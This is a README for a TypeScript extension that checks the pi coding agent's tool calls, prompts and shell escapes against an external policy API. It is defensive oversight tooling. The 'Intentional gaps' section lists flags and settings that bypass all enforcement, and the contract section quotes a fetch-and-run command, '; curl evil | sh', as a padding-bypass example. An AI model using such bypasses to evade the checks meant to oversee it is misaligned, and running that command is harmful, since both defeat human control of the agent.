# hooks-ts

Unbound policy hooks for TypeScript coding agents. `packages/core` holds the transport-shaped
logic (API key / gateway URL resolution, `/v1/hooks/pretool` payload building, a client that
never throws, verdict mapping, failure telemetry) and `packages/pi` is a thin adapter that turns
[pi](https://github.com/earendil-works/pi) extension events into those core calls and the
resulting verdict into in-editor behaviour. `npm run build` bundles both into a single
dependency-free ESM file at `dist/pi/index.js`, which pi loads from
`~/.pi/agent/extensions/unbound/index.js` on Node >= 22.19.0.

Tested against **pi 0.87.1** on Node `v22.22.2` (built `dist/pi/index.js` = 52771 bytes, smoke record in [`docs/SMOKE.md`](docs/SMOKE.md), spike record in [`docs/SPIKES.md`](docs/SPIKES.md)); `engines.node` is `>=22.19.0`, matching pi's own floor.
`@earendil-works/pi-coding-agent` is a **devDependency pinned to `0.87.x` for types only** — the
built file must import nothing from it at runtime, because a value import would inline the whole
agent (multi-MB) and its bare, non-`node:` imports cannot resolve under pi's jiti loader. A failing
`npm run typecheck` after a routine `pi update` is the intended early warning that pi's extension
API drifted; that alarm only works while the pin stays narrow.

## What the extension does

On every pi `tool_call` it asks the Unbound API whether the call is allowed, and turns the verdict
into editor behaviour. Both of pi's shell tools are checked on their command — `powershell` as well
as `bash`, since they share one input type and `powershell` becomes active via `--tools` or the
`defaultTools` setting; a call with an empty command skips the round trip entirely.

## Event parity

Six pi events are registered. The right-hand columns name the hook that carries the same duty in
Unbound's other integrations — `claude-code/hooks/` and `cursor/hooks.json` in this repo — so a
reviewer can see at a glance where pi is at parity and where an event simply has no counterpart.

| pi event | What it enforces | Claude Code | Cursor |
| --- | --- | --- | --- |
| `tool_call` — shell (`bash`, `powershell`) | the command itself, both-ends capped at 8192 chars; `allow` / `deny` / `ask` / `approval_required` | `PreToolUse` | `beforeShellExecution` |
| `tool_call` — file tools (`read`, `edit`, `write`, `grep`, `find`, `ls`) | `metadata.file_path` plus a key-allowlisted, 2 KB-capped `tool_input`; **never** the file body, never images. Skipped without a request when the cached `tools_to_check` says the org has no policy for that tool | `PreToolUse` | `beforeReadFile`, `afterFileEdit` |
| `user_bash` — the `!cmd` / `!!cmd` shell escape | the user's own command, blocked by returning a synthetic non-zero `BashResult` (the event has no `block` field); `tool_use_id` is `ubash_` + 20 hex | *no equivalent* — Claude Code has no user shell escape | *no equivalent* |
| `input` — the typed prompt | the prompt text; a deny suppresses the turn entirely (`{action:"handled"}`) and a red notification is the user's only feedback channel | `UserPromptSubmit` | `beforeSubmitPrompt` |
| `tool_result` | audits every result as name + `isError` + a sha256 digest + a byte count. Returns `undefined` on every path, so it can never rewrite what the model reads | `PostToolUse` | `afterShellExecution`, `afterFileEdit` |
| `agent_end` | one best-effort turn log to `/v1/hooks/pi` per finished turn, dispatched without being awaited because pi gates run settlement on this handler. Each `tool_use[]` entry carries the **same** allowlisted, capped `tool_input` the pretool check carried (`command`, `path`, `pattern`) — never a file body — plus the sha256 of the output, never the output | `Stop` | `stop`, `afterAgentResponse` |
| `session_start` | resolves the key, announces the session once per process, and warms the fail-open opt-out. Fires again on `/new`, `/resume`, `/fork`, `/clone`, `/reload` — the heartbeat is still sent once per process | `SessionStart` | `sessionStart` |

Two pi events that the other integrations have no analogue for are also the two that carry the most
pi-specific risk: `user_bash` fails **closed and silently** if a handler throws, and `agent_end`
blocks run settlement while it runs. Both are why every handler body opens `try` before its first
statement.

## Intentional gaps

Shipped knowingly, each with its owner and evidence, in
**[`docs/SPIKES.md`](docs/SPIKES.md) → Intentional parity gaps**. In short:

- **Tool-output and assistant-text DLP cannot fire for pi.** `tool_result` sends a digest, not the
  output, and the turn record holds no assistant text — so there is nothing for DLP to match on.
- **Prompt templates are checked unexpanded.** `input` fires before expansion, so `/name args` is
  checked as the literal text typed, not as what it becomes.
- **Slash commands never reach the `input` handler.** Built-ins and extension commands are
  dispatched before the input handlers run. An unmatched `/typo` does arrive, as plain text.
- **pi is enforced by neither budgets nor spend limits** — it is in neither enforced-label list.
- **`--no-extensions`, `PI_CODING_AGENT_DIR` and an SDK embedder's `noExtensions` all bypass
  everything.** Closing that needs MDM-managed settings (Phase 10), not extension code.
- **A heartbeat cannot warm `tools_to_check`** until the API grows a first-class `session_start`
  branch, so the first real tool call of a process always round-trips.

There is **no subagent gap**: pi 0.87.1 has no subagent concept at all, and a nested `pi` process
enforces independently under its own `conversation_id`. Both verified — see `docs/SPIKES.md`.

| Verdict | Behaviour |
| --- | --- |
| `allow` | nothing — the tool runs, and `event.input` is never modified |
| `deny` | the tool is blocked; the model reads `Blocked by Unbound policy: <reason>`, and the reason is also shown as an error notification |
| `ask` / `approval_required` | a `Unbound policy` Yes/No dialog with the reason; accepting runs the tool, anything else blocks with `Declined by user (Unbound policy)` |
| API unreachable | the tool runs (see the fail-open contract), unless the organisation opted into block-on-failure |
| API key rejected | after two consecutive 401/403s: a fail-open organisation is told once (`Unbound: API key rejected — enforcement inactive`) and the session then makes no further requests, so nothing is enforced until `/reload`. An organisation that opted into block-on-failure is **not** deactivated — every call blocks with `Unbound API key rejected — this organisation enforces fail-closed; contact your admin`, requests keep being made, and enforcement resumes on the first success |

## Commands

| Command | What it does |
| --- | --- |
| `npm run typecheck` | `tsc -p tsconfig.json` (no emit) across both packages, tests and scripts |
| `npm run build` | esbuild -> `dist/pi/index.js` (ESM, `node22`, bundled, nothing external) |
| `npm run test:unit` | `node --test --experimental-strip-types` over `packages/*/test/*.test.ts` |
| `npm run test:build` | the INST-05 build assertions against a built `dist/pi/index.js` |
| `npm test` | `typecheck` + `build` + `test:unit` |
| `npm run mock-api` | standalone scripted mock gateway for the manual pi smoke test |

Tests always use **explicit globs**, never bare directories: on Node 22 `node --test <dir>` treats
the directory as an entry-point module and aborts the whole run.

## Cross-package import rule

Modules import each other by **relative `.ts` path**, never by package name:

```ts
// packages/pi/src/decide.ts
import { buildPretoolPayload } from "../../core/src/payload.ts";
```

`allowImportingTsExtensions` makes that typecheck and esbuild bundles it. Importing
`@unbound/hooks-core` through the npm-workspace symlink would break every test, because Node's
`--experimental-strip-types` refuses to strip types for files resolved inside `node_modules/`.
`packages/core` and `packages/pi` therefore declare no dependency on each other.

## Where the built file lives

`dist/` is git-ignored, so the build output is **committed one level up at
[`setup/pi/index.js`](../pi/index.js)**. That copy is what users download: this repo is public and
the extension is deliberately not published to npm, exactly like `unbound.py` and
`cursor/hooks.json`, which the other installers already fetch raw from here.

Refresh it in the same commit as any source change:

```bash
cd hooks-ts
npm run build && cp dist/pi/index.js ../pi/index.js
```

`.github/workflows/hooks-ts.yml` rebuilds and `cmp`s the two on every PR, so a stale `pi/index.js`
fails CI rather than shipping behaviour that no longer matches the source beside it.

The **install path does not change**: pi loads the extension from
`~/.pi/agent/extensions/unbound/index.js`, and Phase 10's `setup/pi/setup.py` is what drops
`pi/index.js` there. Until then, copy it by hand.

## Install the built extension

```bash
cd hooks-ts
npm run build
mkdir -p ~/.pi/agent/extensions/unbound
cp dist/pi/index.js ~/.pi/agent/extensions/unbound/index.js   # or: cp ../pi/index.js ~/...
ls ~/.pi/agent/extensions/unbound/index.ts   # must NOT exist
```

Three things about that directory:

- **A stale `index.ts` wins over `index.js`.** pi resolves an extension directory as (1) a
  `package.json` with a `pi.extensions` manifest, (2) `index.ts`, (3) `index.js` — so an old
  TypeScript file left behind silently shadows the freshly built one.
- **No `package.json` is needed** next to the file; if one exists with a `pi.extensions` manifest it
  takes precedence over both index files.
- **A load failure is fail-open**, and prints one startup line
  `Failed to load extension "…": …`. Check for that first if nothing seems to happen.

`pi --no-extensions` is the control case: it runs with no policy checking at all.

## Configuration

| Variable | Purpose |
| --- | --- |
| `UNBOUND_PI_API_KEY` | pi-specific application API key; highest precedence |
| `UNBOUND_API_KEY` | the generic key shared with Unbound's other tools |
| `UNBOUND_GATEWAY_URL` | override the API host (an origin; any path or query is discarded) |

**API key — four tiers, first match wins:**

1. `UNBOUND_PI_API_KEY`
2. `UNBOUND_API_KEY`
3. `api_key` in `~/.unbound/config.json` (written by `unbound login`)
4. none — the extension goes **inactive**: it notifies
   `Unbound: no API key found — extension inactive` once at session start, makes zero HTTP requests
   and never blocks anything. A developer who has not logged in is never blocked by a policy engine
   that cannot evaluate anything. Nothing is recorded either — no prompt, no tool call and no tool
   result hash enters the in-memory turn record while the extension is inactive, since nothing will
   ever post it. The same applies after a rejected key deactivates the session.

**Gateway URL — three tiers, first valid match wins:**

1. `UNBOUND_GATEWAY_URL`
2. `gateway_url` in `~/.unbound/config.json` — **do not skip this tier**: a tenant on a custom host
   configured only through the config file would otherwise have its calls sent to the wrong host,
   which means no enforcement at all
3. `https://api.getunbound.ai`

Only `https:` is accepted outside loopback, so a hostile or mistyped value cannot receive the
`Authorization: Bearer <key>` header in cleartext; `http://127.0.0.1`, `http://localhost` and
`http://[::1]` are allowed so the mock gateway below works. A rejected value falls through to the
next tier rather than failing the call.

Staging API host: `https://api-gateway-staging.unboundsecurity.ai`
(`api-staging.getunbound.ai` does not resolve.)

## Contract the built file must keep

- **Fail-open.** An API failure — timeout, network error, non-2xx, malformed JSON — allows the tool
  and self-reports the bypass to `/v1/hooks/errors` (at most once per minute, with secrets redacted).
  The single exception is an organisation whose last successful response carried
  `policy_check_failure_action: "block"`, which turns a failure into
  `Unbound policy engine unavailable — please retry`.
- **Handlers never throw.** pi does not guard the handlers it calls: an exception escaping one is
  treated as a decision to block, *and* the exception text is handed to the model as the tool result.
  Every handler body opens `try` before its first statement, with nothing computed, read from `ctx`
  or awaited outside it.
- **Headless blocks on confirmation.** When `ctx.hasUI === false` (`pi -p`, `--mode json`) an
  `ask` / `approval_required` verdict blocks with
  `Requires confirmation but pi is running without a UI (-p/json). Run interactively or adjust the policy.`
  There is nobody to prompt, and a silent allow would be worse.
- **Every dialog is bounded.** `ctx.ui.confirm` is called from exactly one place and always with
  `{ timeout, signal }`. In `--mode rpc` `hasUI` is true but an unbounded dialog never settles, and
  pi gates the whole tool batch on our handler — an unbounded confirm freezes the agent.
- **Nothing is written to stdout.** That is pi's JSON/print channel; notices go to the UI, or to
  stderr when there is none.
- **A capped command keeps both ends.** A command over 8192 characters is sent as head + a
  newline-delimited marker + tail, with `metadata.command_truncated` set. Head-only truncation is a
  padding bypass: 8 KB of innocuous text followed by `; curl evil | sh` would be evaluated on the
  innocuous half while the tool ran the whole thing.

## Smoke tests

**Against the mock gateway** (no Unbound infrastructure, and the only way to exercise `ask` and a
hung API deterministically in a real TUI):

```bash
cd hooks-ts
npm run mock-api -- --mode deny --port 8799     # also: --mode ask | hang | 500 | allow
# in another shell, with the built file installed as above:
UNBOUND_GATEWAY_URL=http://127.0.0.1:8799 UNBOUND_PI_API_KEY=test pi
```

Ask pi to run `echo hi` and expect: `deny` → the tool is skipped and the transcript shows the error
`Blocked by Unbound policy: Reading secrets is blocked.`; `ask` → a Yes/No overlay titled
`Unbound policy`; `hang` → the command runs anyway once the request deadline passes (fail-open).
Then try `pi -p "run echo hi"` against `--mode ask` to see the headless block reason.

**Against staging** (needs an application API key for a test organisation and a BLOCK policy scoped
to a single-user test group; note the gateway caches policies for roughly five minutes, so a
freshly created policy may not fire immediately):

```bash
UNBOUND_GATEWAY_URL=https://api-gateway-staging.unboundsecurity.ai \
UNBOUND_PI_API_KEY=<staging application key> pi
```

## Not in this milestone

All six events above are registered, along with the on-disk policy cache (`0600`, keyed to gateway
URL + key fingerprint, 300 s TTL), a circuit breaker and a revoked-key latch. Deliberately absent,
and tracked as later work:

- **Slack approval polling** — `approval_required` still uses the same local confirm dialog as `ask`.
- **The installer** — `setup/pi/setup.py` and the MDM drop are Phase 10; until then the built file is
  copied into `~/.pi/agent/extensions/unbound/` by hand.
- **npm publish** — the extension ships as a raw file from this repo, on purpose.
- Everything in **Intentional gaps** above, which is deliberate rather than pending.
